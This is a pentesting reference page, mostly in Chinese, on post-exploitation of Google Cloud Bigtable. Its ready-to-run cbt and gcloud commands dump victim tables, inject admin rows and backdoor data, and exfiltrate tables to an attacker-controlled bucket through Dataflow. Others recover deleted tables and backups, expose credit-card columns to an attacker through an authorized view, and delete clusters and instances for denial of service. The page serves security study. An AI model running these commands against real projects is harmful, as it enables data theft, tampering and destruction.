# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

关于 Bigtable 的更多信息请参阅：

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> 通过 Cloud SDK 安装一次 `cbt` CLI，以便下面的命令可以在本地运行：
>
> ```bash
> gcloud components install cbt
> ```

### 读取行

**权限:** `bigtable.tables.readRows`

`cbt` 随 Cloud SDK 一起提供，可以直接与管理员/数据 APIs 通信，无需任何中间件。将其指向已被入侵的 project/instance，然后直接从表中导出行。如果只需查看部分内容，请限制扫描范围。
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### 写入行

**权限：** `bigtable.tables.mutateRows`, (你需要 `bigtable.tables.readRows` 来确认更改)。

使用相同的工具 upsert 任意单元格。这是 backdoor 配置、drop web shells 或 plant poisoned dataset rows 的最快方式。
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set` 接受通过 `@/path` 语法的原始字节，因此你可以按下游服务的预期推送编译后的 payloads 或序列化的 protobufs。

### 将行导出到你的 bucket

**权限:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

可以通过启动一个 Dataflow job，将行流式写入你控制的 GCS bucket，从而 exfiltrate 整个表的内容到攻击者控制的 bucket。

> [!NOTE]
> 注意，你需要对具有足够执行导出权限的某个 SA 拥有 `iam.serviceAccounts.actAs` 权限（默认情况下，除非另有说明，否则将使用默认 compute SA）。
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> Switch the template to `Cloud_Bigtable_to_GCS_Parquet` or `Cloud_Bigtable_to_GCS_SequenceFile` if you want Parquet/SequenceFile outputs instead of JSON. The permissions are the same; only the template path changes.

### Import rows

**Permissions:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

可以通过启动一个 Dataflow 作业，将行流式写入你控制的 GCS 存储桶，从而从攻击者控制的存储桶导入整个表的内容。为此，攻击者首先需要创建一个包含要导入数据且符合预期 schema 的 parquet 文件。攻击者可以先按照前述方法使用 `Cloud_Bigtable_to_GCS_Parquet` 将数据导出为 parquet 格式，然后在下载的 parquet 文件中添加新条目。



> [!NOTE]
> Note that you will need the permission `iam.serviceAccounts.actAs` over a some SA with enough permissions to perform the export (by default, if not aindicated otherwise, the default compute SA will be used).
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### 恢复备份

**权限：** `bigtable.backups.restore`, `bigtable.tables.create`.

拥有这些权限的攻击者可以将备份恢复到其控制的新表中，从而能够恢复旧的敏感数据。
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### 恢复已删除的表

**权限:** `bigtable.tables.undelete`

Bigtable 支持软删除并具有宽限期（通常默认 7 天）。在此期间，拥有 `bigtable.tables.undelete` 权限的攻击者可以恢复最近删除的表并恢复其所有数据，可能访问原本以为已被销毁的敏感信息。

这对于以下情况尤其有用：
- 从防御方在事件响应期间删除的表中恢复数据
- 访问被有意清除的历史数据
- 撤销意外或恶意的删除以维持持久性
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> undelete 操作仅在已配置的保留期内有效（默认 7 天）。在此窗口过期后，表及其数据将被永久删除，无法通过此方法恢复。


### 创建授权视图

**Permissions:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

授权视图允许你展示表的一个经过筛选的子集。不是去遵循 least privilege，而是用它来发布 **精确的敏感列/行集** 并将你自己的主体列入白名单。

> [!WARNING]
> 问题在于，创建授权视图还需要能够读取并修改基础表中的行，因此你并没有获得任何额外权限，所以这个技术基本上没什么用处。
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
因为访问被限定在视图范围内，防御者常常忽略你刚刚创建了一个新的高敏感性端点。

### 读取授权视图

**权限：** `bigtable.authorizedViews.readRows`

如果你有权访问一个授权视图，可以在读取请求中指定该授权视图的名称，使用 Bigtable 客户端库从中读取数据。请注意，授权视图可能会限制你可以从表中访问的内容。下面是一个使用 Python 的示例：
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service 通过删除操作

**权限:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

任何具有 Bigtable 删除权限的许可都可以被用于 denial of service attacks。拥有这些权限的攻击者可以通过删除关键的 Bigtable 资源来中断操作：

- **`bigtable.appProfiles.delete`**: 删除应用配置文件，破坏客户端连接和路由配置
- **`bigtable.authorizedViews.delete`**: 移除授权视图，切断应用的合法访问路径
- **`bigtable.authorizedViews.deleteTagBinding`**: 从授权视图中移除标签绑定
- **`bigtable.backups.delete`**: 销毁备份快照，消除灾难恢复选项
- **`bigtable.clusters.delete`**: 删除整个集群，导致数据立即不可用
- **`bigtable.instances.delete`**: 移除完整的 Bigtable 实例，抹除所有表和配置
- **`bigtable.tables.delete`**: 删除单个表，导致数据丢失和应用故障
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> 删除操作通常是立即生效且不可逆的。测试这些命令之前请确保已有备份，因为它们可能导致永久性数据丢失和严重的服务中断。

{{#include ../../../banners/hacktricks-training.md}}
